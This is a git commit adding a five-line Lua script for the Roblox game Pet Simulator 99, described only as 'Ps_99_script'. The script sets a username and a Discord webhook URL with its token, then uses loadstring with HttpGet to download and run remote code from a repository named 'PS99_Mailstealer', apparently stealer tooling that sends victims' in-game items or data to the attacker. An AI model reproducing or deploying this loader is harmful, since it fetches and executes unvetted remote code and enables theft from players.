b9e857fd8669c8eaf6dd53945ce3a5373626fb40
QuitNoise <mockababa@gmail.com>
2024-05-31 14:26:12 +0300

    Ps_99_script

---
+++ Ps_pp_scrpit.lua
@@ -0,0 +1,5 @@
+Username = "ATKARISI76"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1246056097383710750/nbOEsAHEwOX9r4LR92CD0INz-1Y128KmwzlSp7k5GfENVUN8A7I7j2Q2l_qJ7kNxYVH7"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
